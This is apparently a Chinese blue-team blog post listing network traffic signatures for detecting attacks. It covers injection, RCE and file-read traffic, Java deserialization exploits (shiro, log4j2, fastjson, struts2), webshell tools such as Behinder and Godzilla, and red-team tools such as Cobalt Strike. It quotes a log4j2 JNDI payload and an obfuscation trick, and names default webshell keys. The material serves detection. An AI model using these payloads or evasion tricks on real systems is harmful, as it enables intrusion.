---
title: "攻击流量特征"
date: 2024-04-18
description: "传统漏洞的流量特征，java 反序列化漏洞的流量特征，webshell 工具的流量特征，以及 CobaltStrike 等红队工具的流量特征"
tags: ["蓝队理论"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

### 传统漏洞的流量特征

#### sql&xss

请求包里面有明文 payload，攻击者会尝试很多次，很明显的特征。

#### rce

这里只说最基础的，看到内网 ip 和 net user，curl，more，less 等 windows/linux 系统命令，或者 eval，system 等函数，则判断是 rce 攻击流量。

#### 文件包含

看到 require/include 等函数判断是文件包含攻击流量。

#### 任意文件

看到 /etc/passwd 等敏感目录，判断是任意文件读取/下载/删除攻击流量。

看到上传文件的包里面有明文木马等恶意代码，判断是任意文件上传攻击流量。

### java 反序列化漏洞的流量特征

主要考虑 struts2、shiro、weblogic、log4j2、fastjson 等组件及其历史漏洞的流量特征。

#### java 反序列化数据传输

16 进制编码以 ac ed 00 05 开头，base64 编码为 rO0AB。

有的 Content-Type: application/x-serialization 直接说明是 java 序列化数据包。

#### shiro

shiro 的 cookie 存在反序列化注入点。

shiro 的流量特征是 cookie 有 rememberme 字段并使用 base64 编码。

shiro550 和 shiro721 攻击方法的区别：550 密码撞库，721 填充攻击。

如果 shiro cookie 正确，则返回包不会有 set-cookie: rememberme

大部分 shiro 的响应包里面有回显。

和运维确认 shiro 的版本，如果是 550 则对使用默认 key 的请求解密研判。

#### log4j2

log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}

log4j2 使用 jndi 注入，找恶意 url。

log4j2 流量可以看到 rmi 或者 ldap 字样。

log4j2 流量会出现 dns/ip 相关特征。

log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}

log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid

#### fastjson

fastjson 的强特征是 json 数据以 @type 开头。

fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。

fastjson 流量会看到 rmi 或者 ldap 字样。

fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。

#### struts2 

struts 2 的特征是 %{}（或是其 url 编码 %25%7B...%7D），并且请求体和响应体都包含 payload。

struts2 文件类型基本上是 .action 和 .jsp 文件。

#### weblogic

无强特征，请求体和响应体看到 java 代码则预判为攻击流量。

### webshell 工具的流量特征

这里说的 webshell 流量主要考虑：冰蝎、菜刀、哥斯拉、蚁剑。

#### 冰蝎 behinder

冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位，也可能遇到 admin 的 16 位 md5。

冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。

冰蝎 4.0 有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd。

冰蝎 2.0-3.0 使用 aes 加密 + base64 编码；4.0 不再有连接密码的概念，自定义的传输协议算法就是连接密码。

冰蝎 3.0 连接 jsp 的 webshell 的请求数据包中的 content-type 字段常见为 application/octet-stream。

冰蝎 4.0 弱特征：Accept 字段为 Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可以接受任何格式，但是更倾向于接受 application/json 和 text/javascript。

冰蝎 4.0 会使用例如 49700 之类的比较大的端口进行 tcp 连接，且端口依次增加。

冰蝎 4.0 使用长连接 Connection：Keep-Alive。

#### 菜刀 caidao

菜刀 php webshell 使用 base64 编码在请求体中对一句话木马进行明文传输，payload 解码后会看到 eval、assert、base64_decode 字样。响应体有两个竖杠||。会使用 base64_decode 函数进行打断 ("@e"."v"."al")。

菜刀 jsp webshell 的第一段链接流量会看到 i=A&z0=GB2312 字样，第一个参数为 A-Q，第二个参数指定编码。有时会看到 z1、z2 参数写 payload。

菜刀 asp webshell 会使用 unicode 编码，payload 使用一句话木马。

#### 哥斯拉 godzilla

哥斯拉的强特征是 cookie 后面有个分号，目前版本的哥斯拉无法去除这个特征。

哥斯拉的响应体的结构是 md5 前 16 位 + base64 + md5 后 16 位。

哥斯拉默认的 user-agent 会暴露 jdk 信息，但是哥斯拉支持自定义请求头，所以攻击者可以去除这个特征。

哥斯拉的 Accept字段默认是 Accept:text/html,image/gif,image/jpeg,*;q=.2,/;q=.2，但是同上，攻击者可以修改请求头信息，所以只作为一个辅助监测手段。

哥斯拉会发三个特定请求。

#### 蚁剑 antsword

蚁剑的请求体含有 ini_set、set_time_limit、display_errors 字样。

蚁剑的 ua 头为 antsword/v2.1，但是攻击者可以去除这个特征。

蚁剑的响应体为 base64 编码，随机数 + 结果 + 随机数。

蚁剑的 php webshell 使用 eval 和 assert 函数；asp webshell 使用 assert 函数；jsp webshell 使用 java 类加载。

蚁剑加密数据包的参数很多以 _0x... 的形式出现（下划线可替换为其他字符）。

### 红队工具流量特征

#### CobaltStrike

木马相关。

默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。

木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。

下发任务的方法是 c2 服务器在心跳包的响应里发送任务。

beacon 使用 post 回传数据并且 url 为 /submit.php?id=

stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。

stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。

#### metasploit

木马相关。

响应包有 MZ 标头和 cannot be run in DOS mode 字样。

心跳包、固定 ua 头。

#### nmap&fscan

扫描相关。

共同特征。开 wireshark，请求包看到 window:1024 和 options(4 bytes): tcp option。

#### frp

隧道相关。

连接成功会看到 run_id。

#### nps

隧道相关。

第一个请求包末尾有版本号，例如 0.26.1.0。

第二个请求包有 32 为双向认证。